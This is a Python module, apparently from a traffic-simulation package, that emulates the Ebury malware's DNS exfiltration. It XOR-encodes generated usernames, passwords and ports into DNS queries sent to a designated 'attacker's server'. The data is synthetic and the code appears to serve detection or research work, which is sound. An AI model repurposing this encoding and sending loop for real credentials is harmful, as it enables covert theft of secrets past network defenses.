import asyncio
import random

from tdns.exfil import exfil, limit_size, SEND_NO_WAIT


class ebury(exfil):

    idchar = 'e'

    def __init__(self, resolver_addr, xor_key=0x000d5345, key_size=4,
                 amount=5000, time=2, method=SEND_NO_WAIT, random_delay=False):
        '''
        args:
            resolver_addr: The attacker's server's address. There is no default
                           here because this exfil method sends direct DNS/UDP
                           messages to the attacker's server.

            xor_key, key_size: clear from name
        '''
        super().__init__(
            amount, time, method, resolver_addr, random_delay, prepend=False)
        self.xor_key = xor_key
        self.key_size = key_size
        self.ip = self.data.ipv4()

    def encode(self, text):
        int_list = list(map(ord, text))
        split_list = [int_list[i:i+self.key_size]
                      for i in range(0, len(text), self.key_size)]

        def concat_bytes(lst):
            result = 0
            for i in range(self.key_size):
                if i >= len(lst):
                    break
                result <<= 8
                result += lst[i]
            return result

        def mask_of_ones(size):
            result = 0
            for _ in range(size):
                result <<= 8
                result += 0xff
            return result

        def hex_cor(n):
            result = hex(n)[2:]
            # if e.g. \t is leading the coded tuple,
            # we add a 0 to maintain consistency in length
            if len(result) % 2:
                result = '0'+result
            return result

        return ''.join(map(hex_cor, ((concat_bytes(seg) ^ self.xor_key) & mask_of_ones(len(seg)) for seg in split_list)))

    # passphrase would practically be same as this
    @limit_size
    def login_inward(self):
        pre_encoded = f'{self.data.user_name()}:{self.data.password()}'
        return f'{self.encode(pre_encoded)}.{self.data.ipv4()}'

    @limit_size
    def login_outward(self):
        pre_encoded = f'{self.data.user_name()}:{self.data.password()}:{self.data.port_number(is_system=True)}'
        return f'{self.encode(pre_encoded)}.{self.data.ipv4()}'

    async def call__aux(self):
        methods = [self.login_inward, self.login_outward]
        while self.amount > 0:
            qname = random.choice(methods)()
            await self.method(qname)
            self.amount -= 1
            await asyncio.sleep(self.delay())
